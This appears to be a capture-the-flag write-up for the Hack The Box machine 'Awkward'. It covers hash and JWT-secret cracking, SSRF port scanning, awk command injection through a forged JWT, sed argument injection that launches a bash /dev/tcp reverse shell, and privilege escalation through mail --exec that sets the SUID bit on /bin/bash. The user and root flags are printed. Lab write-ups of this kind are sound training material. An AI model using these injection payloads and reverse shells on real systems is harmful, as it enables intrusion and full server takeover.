Let's add `awkward` to `/etc/hosts`
```
echo "10.10.11.185	awkward.htb" | sudo tee -a /etc/hosts
```
- Upon attempting to reach `awkward.htb` we receive an error message:
- `Cannot reach hat-valley.htb`
- Let's change the endpoint so the line in `/etc/hosts` looks like:
```bash
10.10.11.185	hat-valley.htb
```

- There we go. Now we can visit:
- [[http://hat-valley.htb/]]

- We can run `autorecon` and `feroxbuster` in the background while we manually browse the site.
```bash
sudo (which autorecon) hat-valley.htb
```
- Also
```bash
feroxbuster -u http://hat-valley.htb -n -t 5 -L 5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox_hat-valley_out.txt
```

- There were a lot of files to sift through.
- On the initial web page we found some employees within the `carousel`.
	- We will use these names later so take note of them.
- We had found some directory locations at:
	- `/js/src/app.js`
	- There was a `/Dashboard` endpoint that led to:
		- `http://hat-valley.htb/hr`
			- A login form
- After entering arbitrary login credentials we can see the endpoint is:
	- [[http://hat-valley.htb/api/login]]

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121215944.png)

- Let's generate possible login username/password variations with a convenient script I picked up off of `MayorSec` within his `Movement, Pivoting and Persistence` course.
```bash
wget https://raw.githubusercontent.com/krlsio/python/main/namemash.py
chmod 700 namemash.py
```
- Here are the usernames in a file named `rawnames`
```bash
Jackson Lightheart
Bean Hill
Christine Wool
Christopher Jones
```
- Now we can run:
```bash
python namemash.py rawnames > usernames.txt
```

- There is no form of information disclosure when trying to log in with any of these usernames.
- We will shift our focus back towards the `app.js` file.
- Browse to:
	- [[http://hat-valley.htb/js/app.js]]
- You can search for `api` and `login`.
- This will lead you to `baseURL + `
- This leads us to additional endpoints.
	- `hat-valley.htb/api/endpoints_here`
```bash
all-leave
submit-leave
login
staff-details
store-status
```

- We can go directly to:
	- [[http://hat-valley.htb/api/staff-details]]
- You will see `JsonWebTokenError: jwt malformed`.
- Now if you were paying attention and being an astute researchers you would've noticed the header on each page.
	- `Cookie: token=guest`
- If you go to the `devloper console`, visit the `application` tag and select `Cookies` you can delete this token.
- Refresh the page.
- Now we find some convenient hashes:
```bash
[{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121222516.png)

- Let's put together a file with our hashes:
```bash
6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f
```

Let's check with `hashid` or `hash-identifier` for the hash type.
```bash
hashid 6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
```
- `hash-identifier` usually has more clear results.
```
hash-identifier
HASH: 6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121223259.png)

- On our host machine, in order to utilize the power of the GPU we will determine the proper `hashcat` `Hash-Mode` to use.
```bash
hashcat --help | grep -e sha -e 256 -e Raw
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121223520.png)

- `1400` will be our first go-to and will be successful with a single hash that we discover!
```bash
hashcat -a 0 -m 1400 hashes.txt rockyou.txt
```

- Output:
```bash
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121223643.png)

- Before we move on it's worth mentioning that we can bypass the login authentication for the user `admin` at `http://hat-valley.htb/api/login`.
	- On the `/Dashboard` endpoint you can then go to `developer tools`, `Network` and discover the `/staff-details` endpoint this way.

- Seeing we had a password with the name `chris` in it I narrowed the usernames down to those involving the `Christopher Jones`  user.
```bash
cat chris

Christopher Jones
```
- Run `namemash.py`

```bash
python namemash.py chris > chris.txt
```

- Now we have a shorter list.

```bash
cat chris.txt

christopherjones
joneschristopher
christopher.jones
jones.christopher
jonesc
cjones
jchristopher
c.jones
j.christopher
christopher
jones
```

- After attempting to automate the login procedure with both `Zap` and `Burp` and failing I had opted to manually test out the username/password and succeeded with:

```bash
christopher.jones:chris123
```

- We can see right off the bat in our proxy that there is a token that looks similar to a `jwt` token. This is where `BurpSuite` shines for me.
- If you have `JWT Editor` extension installed you will see the bright green colors verifying it is in fact a `jwt` token.
![image](https://0xc0rvu5.github.io/docs/assets/images/20230121230618.png)

- There are a number of ways to use these tokens with attacks. I recommend checking out `PortSwigger's Academy` on the matter. It has some pretty cool scenarios to get your hands wet with `jwt` attacks.
- Anyways we are going to make sure we have a version of `jwt2john` installed on our host.

```bash
wget https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
chmod 700 jwt2john.py
```

- Convert the hash with `jwt2john`
```bash
python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc0MzYzMTMxfQ.AvGDOOJbvJYYpr6YWK-w5xMxudrcul58DfOKrpspync > jwt_hash
```

- Let's see if we can find the secret `verify signature`.
```bash
john jwt_hash -w=/usr/share/wordlists/rockyou.txt
```

- Output:
```bash
123beany123
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121231323.png)

- We don't have any way to utilize the `jwt` token just yet, but stay tuned.
- Next we enumerate the `http://hat-valley.htb/dashboard` as `Chrisopher`.
- We can click the `Refresh` button and find the `store-status` endpoint we previously discovered.
```bash
http://hat-valley.htb/api/store-status?url=http://store.hat-valley.htb
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121232100.png)

- Let's test for `SSRF`.
- Change:
```bash
http://hat-valley.htb/api/store-status?url=http://store.hat-valley.htb
```
- To:
```bash
http://hat-valley.htb/api/store-status?url=http://localhost
```

- We get a `200 OK` and no error.
- `Server-side Request Forgery (SSRF)` - A type of web application vulnerability that allows an attacker to send crafted requests from a vulnerable server to another internal or external server on behalf of the server. This allows the attacker to access potentially sensitive information, such as internal network resources or other servers, that would not be accessible from the external network.
- If we can pretend we are `localhost` we can determine if there are any internal ports open on the server in question..
- Let's craft a script to generate ports from 1-63555.
- I am using a fish shell so this works for me:
```fish
for i in (seq 1 63555)
             echo $i >> ports.txt
     end
```

- Let's spin up `wfuzz` to determine potential open ports:
```bash
wfuzz -c -f awkward_api_store-status_wfuzz_out.txt -u 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"' -w ports.txt --hl 0
```
`-c` - Colorize the output. 
`-f` - This switch tells wfuzz to use a specific file containing a list of payloads to use in the fuzzing process. 
`-u` - This switch tells wfuzz to use a specific URL as the target for the fuzzing process. 
`-w` - This switch tells wfuzz to use a specific file containing a list of words to use as payloads in the fuzzing process. 
`-H` - This switch tells wfuzz to use specific headers to include in the HTTP requests made during the fuzzing process. 
`--hl` - This switch tells wfuzz to hide the results in the output if the payload is found in the response.

- Output:
```bash
00080:  C=200      8 L	      13 W	    132 Ch	  "80"
03002:  C=200    685 L	    5834 W	  77002 Ch	  "3002"
08080:  C=200     54 L	     163 W	   2881 Ch	  "8080"
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121233456.png)

- Now that we know this we can visit:
```bash
http://hat-valley.htb/api/store-status?url="http://localhost:3002"
```

- We are going to be interested in the `/api/all-leave` endpoint.
```js
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }

  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
```

- Our focus will be on:
```js
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv",
```

- Since `decodedToken` is taking in two arguments of `user_token` and `TOKEN_SECRET` we shouldn't have any issues with altering `user_token` which later gets converted into `user`.
- `user` is then used after the `awk` command. 
```js
if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
```

- Reference the `File read` section on `gtfobins` here:
	- [[https://gtfobins.github.io/gtfobins/awk/]]
- Our username payload:
```bash
"username": "/' /etc/passwd '",
```

- Go to `jwt.io` to customize your `jwt` token.
	- [[jwt.io]]
- It will look like this:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121235243.png)

Here is a convenient bash script that can be used to paste the cookie into then you can choose a path to output the content.
- I named mine `check_token_output.sh`
```bash
echo "Enter cookie: "
read cookie
echo "Outfile name: "
read outfile
curl http://hat-valley.htb/api/all-leave --header "Cookie: token=$cookie" | tee $outfile
```

- The output will look something like this:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230121235848.png)

- We find 2 users other than `root`
- `bean`
- `christine`
```bash
cat awkward_etc_passwd.txt | grep /bin/bash

root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

- After some trial and error (no ssh keys) we grab `bean's` `.bashrc` file since he was identified as `System Administrator` on the initial landing page.
- There is a script located at:
```bash
bat awkward_bean_bashrc.txt

  95   │ # custom
  96   │ alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

- This leads us to:
```bash
cat awkward_bean_backup_home_sh.txt                                                                                                                                                                     

#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

- We grab the `bean_backup_final.tar.gz` file.
- I made a directory for this named `bean`.
```bash
mkdir bean; mv bean_backup_final.tar.gz bean; cd bean
tar xvf bean_backup_final.tar.gz
tar xvf bean_backup.tar.gz
```

- There are quite a few files to sift through. You will find what you are looking for at:
```bash
./.config/xpad/
```

- More specifically:
```bash
cat content-DS1ZS1                                                                                                                                                                            

TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold⏎ 
```

- Username and password:
```bash
bean.hill:014mrbeanrules!#P
```

We can attempt to `ssh`:
```bash
ssh bean@hat-valley.htb
Password: 014mrbeanrules!#P
```

- We're in!
- We can output the `user.txt` flag immediately
```bash
cat user.txt 
04a15632f8bed02d5e4f27ea17c870fa
```

- After some manual enumeration we busted out `linpeas.sh`
- We can see the `store` endpoint at:
```bash
store.hat-valley.htb
```

- `linpeas.sh` output directing us towards the `store` endpoint.
![image](https://0xc0rvu5.github.io/docs/assets/images/20230122001407.png)

- The content of the `store.conf` file.
![image](https://0xc0rvu5.github.io/docs/assets/images/20230122001645.png)

- If you were on your game you would've ran `wfuzz` of a similar tool to determine `subdomains`/`vhosts`
```bash
wfuzz -c -f hat-valley_wfuzz_out.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 200 -H "Host: FUZZ.hat-valley.htb" -u "http://hat-valley.htb"
```
`-c` - Colorize the output.
`-f` - This switch tells wfuzz to use a specific file containing a list of payloads to use in the fuzzing process. 
`-u` - This switch tells wfuzz to use a specific URL as the target for the fuzzing process. 
`-w` - This switch tells wfuzz to use a specific file containing a list of words to use as payloads in the fuzzing process. 
`-H` - This switch tells wfuzz to use specific headers to include in the HTTP requests made during the fuzzing process. 
`--hc` - Hide these response codes.
![image](https://0xc0rvu5.github.io/docs/assets/images/20230122001850.png)

- Then adjusting your `/etc/passwd` file:
```bash
10.10.11.185	hat-valley.htb store.hat-valley.htb
```

- I hadn't mentioned this endpoint until now because it was a dead end.
- It was an additional login.

The second notable mention within the `linpeas.sh` output was the `htpasswd` file.
```bash
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 Sep 15 22:34 /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230122002552.png)

- If you go to:
	- [[https://hashcat.net/wiki/doku.php?id=example_hashes]]
- Search for `$apr1$`
- You will find `Hash-Mode` number `1600`
- Take the hash and `bean's` password and run it through `hashcat` and you will find a match
```bash
cat test_hash 

$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1

cat test 

014mrbeanrules!#P
```
- `hashcat`
```bash
hashcat -a 0 -m 1600 test_hash test
```

- Output:
```bash
$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1:014mrbeanrules!#P
```

- This will become relevant momentarily.
- On `bean` go to `/var/www/store`.
- Since we can see the relevant source code let's being with `README.md`
```bash
cat README.md 
# Hat Valley - Shop Online!

### To Do
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)
3. Implement shop filter
4. Get full catalogue of items

### How to Add New Catalogue Item
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.  
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
```
- Note the last two lines.

- Now to the juicy part!
```bash
cat -n cart_actions.php

	49	//delete from cart
    50	if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    51	    $item_id = $_POST['item'];
    52	    $user_id = $_POST['user'];
    53	    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
    54	
    55	    foreach($bad_chars as $bad) {
    56	        if(strpos($item_id, $bad) !== FALSE) {
    57	            echo "Bad character detected!";
    58	            exit;
    59	        }
    60	    }
    61	
    62	    foreach($bad_chars as $bad) {
    63	        if(strpos($user_id, $bad) !== FALSE) {
    64	            echo "Bad character detected!";
    65	            exit;
    66	        }
    67	    }
    68	    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
    69	        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
    70	        echo "Item removed from cart";
    71	    }
    72	    else {
    73	        echo "Invalid item";
    74	    }
    75	    exit;
    76	}
```

- On lines 68-70 we can see that `sed` is being used. 
- If we can pass in data to `item_id` we can directly execute a script within the file-system if we pass the `-e` argument.
- This argument will execute when the item is deleted.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230122004235.png)

Let's check `BurpSuite` for this one. 

![image](https://0xc0rvu5.github.io/docs/assets/images/20230122004349.png)

- There shouldn't be any reason we can't craft a specific `item_id` on client-side.
- On `bean` create a reverse shell. I'm using the `hack-tools` extension.
- I'll name it `quick.sh` and place it in the `/tmp` directory.
	- `/tmp/quich.sh`
```bash
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.10.16.34/4444 <&1'
```
- Make sure to make it executable for all.
```bash
chmod +x /tmp/quick.sh
```

- Start a reverse shell on `Host`
```bash
nc -lvnp 444
```

- Now add an item to the cart.
- Go to:
	- `/var/www/store/cart`
	- Take note of the `endpoint`.
		- `563c-f335-546-9e1f`
	- As `bean` create the same file as above.
		- `nano /var/www/store/cart/563c-f335-546-9e1f`
```bash
***Hat Valley Cart***
item_id=1' -e "1e /tmp/quick.sh" /tmp/quick.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```
- `1e` - is used in the `sed` command as a command option that tells it to execute a command upon finding a match on the first line of the file.
- Find more details in regards to `sed` here:
	- [[https://gtfobins.github.io/gtfobins/sed/]]
- On the website go to `cart` and delete the item.
- Find the `POST` request in `BurpSuite` and send to repeater.
- The body of your request should look similar to this:
```bash
item=1'+-e+"1e+/tmp/quick.sh"+/tmp/quick.sh+'&user=563c-f335-546-9e1f&action=delete_item
```

Hit send.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230122010344.png)

- We are in for user 2 as `www-data` !
- Let's fix our shell by adding `clear` functionality
```bash
export TERM=xterm
```

- You can spin up another `linpeas.sh` to determine if there is any significant difference. You won't find much.
- The last relevant `linpeas.sh` finding can be found when ran by either user.

```bash
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes

root         997  0.0  0.0  18624  3500 ?        Ss   Jan20   0:00 /bin/bash /root/scripts/notify.sh
root        1017  0.0  0.0   2988  1252 ?        S    Jan20   0:00  _ inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
```

- If you hadn't noticed the importance of the `www-data` at this point I will explain.
```bash
ls -ld /var/www/private

dr-xr-x--- 2 christine www-data 4096 Oct  6 01:35 /var/www/private
```

- Now we can access this `private` directory and write content to the `leave_requests.csv` file and determine what follows.
- Let's get the proper software on the victim machine so we can monitor active processes.
- If you haven't already download `pspy64`.
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

- Spin up a server to transfer it over. I'll use `python`.
- On `Host`
```bash
python -m http.server
```
- On `Victim`
```bash
wget http://10.10.16.34:8000/pspy64
chmod +x pspy64
./pspy64
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230122011419.png)

- We see `root` is utilizing the `mail` command.
- Similar to before we can also use `mail` to execute a script with the `--exec` flag.
- Find more about it here:
	- [[https://gtfobins.github.io/gtfobins/mail/]]
- Let's create another script in the `/tmp` directory which allows us to elevate our privileges by adding `SUID` bit to the `/bin/bash` binary.
-  I'll name my file `theway.sh` in the `/tmp` directory.
- `/tmp/theway.sh`
```bash
#!/bin/bash
chmod +s /bin/bash
```
- Make sure it is executable.
```bash
chmod +x /tmp/theway.sh
```
- As `www-data` run in the `/var/www/private` directory run:
```bash
echo '" --exec="\!/tmp/theway.sh"' >> leav*
```
- Then elevate privileges with:
```bash
/bin/bash -p
```
- The `-p` switch will execute `/bin/bash` in `privileged` mode.

- There you have it!
```bash
cat /home/bean/user.txt 

04a15632f8bed02d5e4f27ea17c870fa

cat /root/root.txt 

59cd607b9a118ca92314b57e3167fe66
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230122012135.png)

#hacking
